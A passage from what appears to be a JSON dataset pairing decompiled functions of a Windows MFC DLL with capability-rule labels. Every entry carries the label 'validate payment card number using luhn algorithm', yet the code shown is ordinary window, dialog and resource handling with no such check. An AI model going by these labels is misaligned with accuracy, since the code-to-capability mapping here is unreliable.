        "decompiled_code": "\nulong fcn.180017b94(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.1800140a8();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x28) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.180009650(0x18001cc6c);\n        arg1_01 = fcn.180009660(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.18002c644(arg1_01, 0x18004fb58, 0x180017764, 0x180012804);\n        }\n        *(iVar1 + 0x28) = uVar2;\n        fcn.180009650(arg1_00);\n    }\n    return *(iVar1 + 0x28);\n}\n",
        "token_count": 223
    },
    "180017c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180017c38(ulong arg1)\n\n{\n    ulong arg1_00;\n    ulong hWnd;\n    \n    arg1_00 = fcn.180017b94(1);\n    hWnd = fcn.18002c71c(arg1_00, arg1);\n    fcn.18001c0b8(hWnd, arg1_00);\n    return hWnd;\n}\n",
        "token_count": 84
    },
    "180017ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.180017ca8(int64_t arg1, int64_t arg2)\n\n{\n    int64_t arg2_00;\n    int64_t *piVar1;\n    \n    if (arg2 != 0) {\n        arg2_00 = fcn.180017b94(1);\n        *(arg1 + 0x40) = arg2;\n        piVar1 = fcn.18002d358(arg2_00 + 0x30, arg2);\n        *piVar1 = arg1;\n        fcn.18001c0b8(arg1, arg2_00);\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 144
    },
    "18001806": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180018064(ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    arg3 = arg3 & 0xffffffff;\n    iVar1 = (*_sym.imp.USER32.dll_GetDlgItem)();\n    if (iVar1 != 0) {\n        iVar2 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar1);\n        if ((iVar2 != 0) && (iVar2 = fcn.180018064(iVar1, arg2 & 0xffffffff, arg3),  iVar2 != 0)) {\n            return iVar2;\n        }\n        if (arg3 == 0) {\n            iVar1 = fcn.180017c38(iVar1);\n            return iVar1;\n        }\n        iVar1 = fcn.180017c7c(iVar1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    iVar1 = (*_sym.imp.USER32.dll_GetTopWindow)(arg1);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.180018064(iVar1, arg2 & 0xffffffff, arg3);\n        if (iVar2 != 0) break;\n        iVar1 = (*_sym.imp.USER32.dll_GetWindow)(iVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 313
    },
    "18001811": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180018110(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    int64_t arg1_00;\n    \n    arg1_00 = *arg2;\n    while( true ) {\n        if (arg1_00 == 0) {\n            return 0;\n        }\n        piVar2 = fcn.180017c7c(arg1_00);\n        if ((piVar2 != NULL) && (iVar1 = (**(*piVar2 + 0x210))(piVar2, arg2),  iVar1 != 0)) break;\n        if (arg1_00 == arg1) {\n            return 0;\n        }\n        arg1_00 = (*_sym.imp.USER32.dll_GetParent)(arg1_00);\n    }\n    return 1;\n}\n",
        "token_count": 190
    },
    "1800184f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800184f0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    puVar3 = (**(*arg1 + 0x1f0))();\n    (*_sym.imp.USER32.dll_SetWindowLongPtrW)(arg1[8], 0xfffffffc, *puVar3);\n    *puVar3 = 0;\n    iVar1 = arg1[8];\n    if (iVar1 != 0) {\n        iVar2 = fcn.1800140a8();\n        if (*(iVar2 + 0x28) != 0) {\n            fcn.18002d184(*(iVar2 + 0x28) + 0x30, arg1[8]);\n        }\n        arg1[8] = 0;\n    }\n    arg1[0x14] = 0;\n    return iVar1;\n}\n",
        "token_count": 206
    },
    "18001896": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.180018964(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong arg1_00;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    if ((arg1 != 0) && (iVar3 = *(arg1 + 0x40),  iVar3 != 0)) {\n        while( true ) {\n            arg1_00 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n            piVar2 = fcn.180017c38(arg1_00);\n            if (piVar2 == NULL) break;\n            iVar1 = (**(*piVar2 + 0x250))(piVar2);\n            if (iVar1 != 0) {\n                return piVar2;\n            }\n            iVar3 = piVar2[8];\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 189
    },
    "180018ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.180018ad0(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    ulong arg2_00;\n    uint64_t uVar3;\n    uchar auStack184 [64];\n    ulong uStack120;\n    int64_t iStack24;\n    \n    iVar2 = fcn.1800140a8();\n    if (*(iVar2 + 0x28) == 0) {\n        uVar3 = 0;\n    }\n    else {\n        iVar2 = *(iVar2 + 0x28) + 0x30;\n        arg1_00 = fcn.18002d110(iVar2, arg1);\n        if (arg1_00 == 0) {\n            arg2_00 = (*_sym.imp.USER32.dll_GetParent)(arg1);\n            iVar2 = fcn.18002d110(iVar2, arg2_00);\n            if (((iVar2 != 0) && (*(iVar2 + 0x98) != 0)) &&\n               (iStack24 = fcn.18002d110(*(iVar2 + 0x98) + 0x48, arg1),  iStack24 != 0)) {\n                fcn.180015290(auStack184, arg1);\n                iVar1 = fcn.180018180(auStack184, arg2);\n                uStack120 = 0;\n                fcn.1800187d8(auStack184);\n                return iVar1 != 0;\n            }\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.180018180(arg1_00, arg2);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 386
    },
    "1800195f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800195fc(ulong arg1)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    ulong uVar3;\n    \n    iVar2 = fcn.180017c7c(arg1);\n    uVar3 = 0;\n    if (iVar2 == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowLongW)(arg1, 0xfffffff0);\n        if ((uVar1 >> 0x1e & 1) == 0) {\n            uVar3 = (*_sym.imp.USER32.dll_GetWindow)(arg1, 4);\n        }\n        else {\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)();\n        }\n    }\n    else {\n        arg1_00 = *(iVar2 + 0x70);\n        if (arg1_00 == 0) {\n            arg1_00 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x40));\n        }\n        iVar2 = fcn.180017c38(arg1_00);\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x40);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 279
    },
    "18001967": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180019674(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1_00;\n    \n    if ((arg1 == 0) || (iVar1 = *(arg1 + 0x40),  *(arg1 + 0x40) == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        do {\n            arg1_00 = iVar1;\n            iVar1 = fcn.1800195fc(arg1_00);\n        } while (iVar1 != 0);\n        uVar2 = fcn.180017c38(arg1_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 153
    },
    "180019aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180019aac(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    if (((arg2 == -2) && (((arg3 == 0x201 || (arg3 == 0x207)) || (arg3 == 0x204)))) &&\n       (iVar2 = fcn.180019674(arg1),  iVar2 != 0)) {\n        uVar3 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(iVar2 + 0x40));\n        iVar2 = fcn.180017c38(uVar3);\n        if (iVar2 != 0) {\n            uVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar4 = fcn.180017c38(uVar3);\n            if ((iVar2 != iVar4) && (iVar1 = fcn.18001bea8(iVar2),  iVar1 != 0)) {\n                (*_sym.imp.USER32.dll_SetForegroundWindow)(*(iVar2 + 0x40));\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 265
    },
    "18001b1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.18001b1a4(ulong *arg1)\n\n{\n    code **ppcVar1;\n    code **ppcVar2;\n    uint uVar3;\n    \n    ppcVar2 = NULL;\n    if (arg1 == NULL) {\n        uVar3 = 0x80004003;\n    }\n    else {\n        *arg1 = 0;\n        ppcVar1 = fcn.180009660(0x30);\n        if (ppcVar1 != NULL) {\n            *(ppcVar1 + 5) = 0;\n            ppcVar1[2] = NULL;\n            ppcVar1[3] = NULL;\n            *ppcVar1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n            ppcVar1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n            ppcVar1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n            fcn.180028dec();\n            ppcVar2 = ppcVar1;\n        }\n        uVar3 = 0x8007000e;\n        if (ppcVar2 != NULL) {\n            uVar3 = 0;\n        }\n        *arg1 = ppcVar2;\n    }\n    return uVar3;\n}\n",
        "token_count": 304
    },
    "18001b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.18001b5c0(int64_t arg1, int16_t *arg2)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int64_t iStackX16;\n    uint auStack104 [2];\n    ulong uStack96;\n    int64_t iStack88;\n    \n    iVar7 = 1;\n    if (arg2 != NULL) {\n        do {\n            iVar2 = *arg2;\n            if (iVar2 == 0) break;\n            iVar5 = arg2[1];\n            uVar3 = *(arg2 + 2);\n            arg2 = arg2 + 4;\n            if (iVar5 == 0x1234) {\ncode_r0x00018001b67d:\n                fcn.180033c90(&uStack96, 0, 0x30);\n                uStack96 = 0xffffffffffffffff;\n                auStack104[0] = 1;\n                fcn.1800087c4(&iStackX16, arg2);\n                iStack88 = iStackX16;\n                iVar6 = (*_sym.imp.USER32.dll_SendDlgItemMessageW)(*(arg1 + 0x40), iVar2, 0x40b, 0, auStack104);\n                if (iVar6 == -1) {\n                    iVar7 = 0;\n                }\n                LOCK();\n                piVar1 = iStackX16 + -8;\n                iVar4 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar4 + -1 < 1) {\n                    (**(**(iStackX16 + -0x18) + 8))();\n                }\n            }\n            else if (iVar5 == 0x401) {\n                iVar5 = 0x180;\ncode_r0x00018001b657:\n                iVar6 = (*_sym.imp.USER32.dll_SendDlgItemMessageA)(*(arg1 + 0x40), iVar2, iVar5, 0, arg2);\n                if (iVar6 == -1) {\n                    iVar7 = 0;\n                }\n            }\n            else {\n                if (iVar5 == 0x403) {\n                    iVar5 = 0x143;\n                }\n                if (iVar5 == 0x40b) goto code_r0x00018001b67d;\n                if ((iVar5 == 0x180) || (iVar5 == 0x143)) goto code_r0x00018001b657;\n            }\n            arg2 = arg2 + uVar3;\n        } while (iVar7 != 0);\n        if (iVar7 == 0) {\n            return 0;\n        }\n    }\n    fcn.180018a08(*(arg1 + 0x40), 0x364, 0, 0);\n    return iVar7;\n}\n",
        "token_count": 657
    },
    "18001b75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001b75c(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint64_t arg3_00;\n    uchar auStack104 [56];\n    ulong uStack48;\n    \n    *(arg1 + 0x40) = arg2;\n    uStack48 = 0x18001b775;\n    iVar5 = fcn.180014058();\n    uStack48 = 0x18001b782;\n    iVar5 = (*_sym.imp.USER32.dll_LoadIconW)(*(iVar5 + 0x18), arg3);\n    *(arg1 + 0x20) = iVar5;\n    if (iVar5 == 0) {\n        uStack48 = 0x18001b798;\n        uVar6 = (*_sym.imp.USER32.dll_LoadIconW)(0, 0x7f00);\n        *(arg1 + 0x20) = uVar6;\n    }\n    uVar6 = *(arg1 + 0x40);\n    iVar2 = fcn.180015c20(*(arg1 + 0x18), uVar6, &stack0xffffffffffffff98);\n    arg3_00 = 0;\n    if (iVar2 == 0) {\n        iVar1 = fcn.180015b84(arg1);\n        if (iVar1 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            iVar5 = fcn.180014058();\n            if (*(iVar5 + 0x28) != '\\0') {\n                fcn.18001ca7c(1, uVar6);\n                iVar4 = fcn.180014058();\n                iVar5 = *(arg1 + 0x40);\n                if (iVar5 != 0) {\n                    uVar3 = fcn.180033b84(iVar5);\n                    arg3_00 = uVar3;\n                }\n                fcn.180008f94(iVar4 + 0x58, iVar5, arg3_00);\n                fcn.180014270(iVar4 + 0x58);\n                int.18001cb10(1);\n            }\n            uVar6 = 1;\n        }\n    }\n    else {\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 539
    },
    "18001bbb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.18001bbb0(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t arg2_00;\n    \n    arg2_00 = 0;\n    iVar4 = 0;\n    if (arg2 != 0) {\n        iVar3 = fcn.180014058();\n        uVar1 = *(iVar3 + 0x18);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(uVar1, arg2, 0xf0);\n        if (iVar3 != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar1, iVar3);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            arg2_00 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar4);\n        }\n    }\n    uVar2 = fcn.18001b5c0(arg1, arg2_00);\n    if ((arg2_00 != 0) && (iVar4 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar4);\n    }\n    return uVar2;\n}\n",
        "token_count": 276
    },
    "18001bce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001bce4(int64_t hDlg, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*(hDlg + 0x78) >> 8 & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageW)(*(hDlg + 0x40));\n    }\n    else {\n        iVar1 = fcn.180014058();\n        (**(**(iVar1 + 0x68) + 0x50))(*(iVar1 + 0x68), hDlg, arg2);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "18001bf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001bf40(int64_t arg1)\n\n{\n    if (*(arg1 + 0xa0) != NULL) {\n        (**(**(arg1 + 0xa0) + 0xc0))();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "18001c04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c040(int64_t hWnd, int64_t arg2, ulong X, ulong Y)\n\n{\n    ulong uVar1;\n    \n    uVar1 = 0;\n    if (*(hWnd + 0xa0) == 0) {\n        if (arg2 != 0) {\n            uVar1 = *(arg2 + 0x40);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(hWnd + 0x40), uVar1);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x138))(*(hWnd + 0xa0), arg2);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "18001c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18001c600(int64_t arg1, int64_t arg2)\n\n{\n    ulong *puVar1;\n    \n    if (*(arg1 + 0x98) != 0) {\n        for (puVar1 = *(*(arg1 + 0x98) + 0x88); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[2] == arg2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 117
    },
    "18001c63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18001c630(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    \n    if (*(arg1 + 0x98) != 0) {\n        for (puVar3 = *(*(arg1 + 0x98) + 0x88); puVar3 != NULL; puVar3 = *puVar3) {\n            piVar1 = puVar3[2];\n            if (piVar1[1] == 0) {\n                iVar4 = *piVar1;\n            }\n            else {\n                iVar4 = *(piVar1[1] + 0x48);\n            }\n            if ((iVar4 != 0) && (iVar2 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar4 == iVar2)) {\n                return puVar3;\n            }\n            if ((piVar1[1] != 0) && (piVar1[1] == *(*(arg1 + 0x98) + 0xd8))) {\n                return puVar3;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 258
    },
    "18001c97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001c978(int64_t arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (arg2 != 0) {\n        do {\n            if (arg1 == arg2) {\n                return 1;\n            }\n            arg1 = *(arg1 + 0x18);\n        } while (arg1 != 0);\n        return 0;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 177
    },
    "18001c9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001c9b0(ulong *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    if (arg1 == NULL) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    iVar3 = (***arg1)();\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (arg2 != 0) {\n        do {\n            if (iVar3 == arg2) {\n                return 1;\n            }\n            iVar3 = *(iVar3 + 0x18);\n        } while (iVar3 != 0);\n        return 0;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 286
    },
    "18001c9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18001c9e4(ulong arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    if ((arg2 == 0) || (iVar1 = fcn.18001c9b0(arg2, arg1),  iVar1 == 0)) {\n        arg2 = 0;\n    }\n    return arg2;\n}\n",
        "token_count": 85
    },
    "18001ca4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.18001ca4c(void)\n\n{\n    if (*0x18006cf3c == 0) {\n        *0x18006cf3c = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x18006d1e8);\n    }\n    return *0x18006cf3c;\n}\n",
        "token_count": 79
    },
    "18001cb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001cb3c(int64_t arg1, int64_t lpString)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar auStack584 [32];\n    ushort uStack552;\n    uchar auStack550 [510];\n    uint64_t uStack40;\n    \n    uStack40 = *0x180067ce0 ^ auStack584;\n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (lpString == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n    uStack552 = 0;\n    fcn.180033c90(auStack550, 0, 0x1fe);\n    if (uVar2 < 0x101) {\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowTextW)(arg1, &uStack552);\n        if (uVar3 == uVar2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&uStack552, lpString);\n            if (iVar4 == 0) goto code_r0x00018001cbd8;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextW)(arg1, lpString);\ncode_r0x00018001cbd8:\n    fcn.180032ea0(uStack40 ^ auStack584);\n    return;\n}\n",
        "token_count": 374
    },
    "18001cbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001cbfc(int64_t *arg1)\n\n{\n    code *pcVar1;\n    \n    if (arg1 == NULL) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (*arg1 != 0) {\n        (*_sym.imp.GDI32.dll_DeleteObject)();\n        *arg1 = 0;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "18001cc2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001cc28(int64_t arg1)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)();\n        uVar2 = uVar1;\n        if (uVar1 != 0) {\n            do {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(arg1);\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(arg1);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "18001cdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001cdc8(int64_t arg1)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0xf);\n    *(arg1 + 0x30) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0x10);\n    *(arg1 + 0x34) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0x14);\n    *(arg1 + 0x38) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0x12);\n    *(arg1 + 0x3c) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(6);\n    *(arg1 + 0x40) = uVar2;\n    uVar1 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0xf);\n    *(arg1 + 0x28) = uVar1;\n    uVar1 = (*_sym.imp.USER32.dll_GetSysColorBrush)(6);\n    *(arg1 + 0x20) = uVar1;\n    return;\n}\n",
        "token_count": 273
    },
    "18001ce3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001ce3c(int64_t arg1)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xb);\n    *(arg1 + 8) = uVar1;\n    uVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xc);\n    *(arg1 + 0xc) = uVar1;\n    *0x18006d260 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n    *0x18006d260 = *0x18006d260 + 1;\n    *0x18006d264 = (*_sym.imp.USER32.dll_GetSystemMetrics)(3);\n    *0x18006d264 = *0x18006d264 + 1;\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n    uVar1 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x58);\n    *(arg1 + 0x18) = uVar1;\n    uVar1 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x5a);\n    *(arg1 + 0x1c) = uVar1;\n    // WARNING: Could not recover jumptable at 0x00018001cec7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    return;\n}\n",
        "token_count": 336
    },
    "18001ced": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18001ced0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    fcn.18001ce3c(arg1);\n    *(arg1 + 0x28) = 0;\n    fcn.18001cdc8(arg1);\n    uVar1 = (*_sym.imp.USER32.dll_LoadCursorW)(0, 0x7f02);\n    *(arg1 + 0x48) = uVar1;\n    uVar1 = (*_sym.imp.USER32.dll_LoadCursorW)(0, 0x7f00);\n    *(arg1 + 0x70) = 0;\n    *(arg1 + 0x58) = 0;\n    *(arg1 + 0x50) = uVar1;\n    *(arg1 + 0x10) = 2;\n    *(arg1 + 0x14) = 2;\n    return arg1;\n}\n",
        "token_count": 204
    },
    "18001cf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001cf70(int64_t **arg1)\n\n{\n    ulong uVar1;\n    \n    if (*arg1 == NULL) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(**arg1 + 0x10))();\n        *arg1 = NULL;\n    }\n    return uVar1;\n}\n",
        "token_count": 78
    },
    "18001cf9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001cf98(ulong arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uchar auStack72 [32];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180067ce0 ^ auStack72;\n    uStack40 = str.mfcm90u.dll._0_8_;\n    uStack32 = str.mfcm90u.dll._8_8_;\n    uStack24 = str.mfcm90u.dll._16_8_;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(&uStack40);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"AfxmReleaseManagedReferences\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(arg1);\n        }\n    }\n    fcn.180032ea0(uStack16 ^ auStack72);\n    return;\n}\n",
        "token_count": 234
    },
    "18001d22": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
